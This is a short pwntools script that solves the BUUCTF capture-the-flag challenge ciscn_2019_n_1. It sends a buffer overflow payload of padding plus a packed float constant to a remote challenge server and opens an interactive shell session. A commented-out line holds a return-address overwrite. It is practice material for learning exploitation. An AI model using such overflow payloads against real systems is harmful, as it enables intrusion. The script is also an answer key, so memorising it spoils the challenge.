from pwn import *

path="/mnt/e/S/CTF/BUUCTF/PWN/ciscn_2019_n_1"

#payload=b'a'*(128+8)+p64(0x00400596)
payload = b'a'*(0x2c)+p32(0x41348000)
#sh=process(path)
sh=remote('node4.buuoj.cn',28493)

#sh.recvuntil(b">")

sh.sendline(payload)

sh.interactive()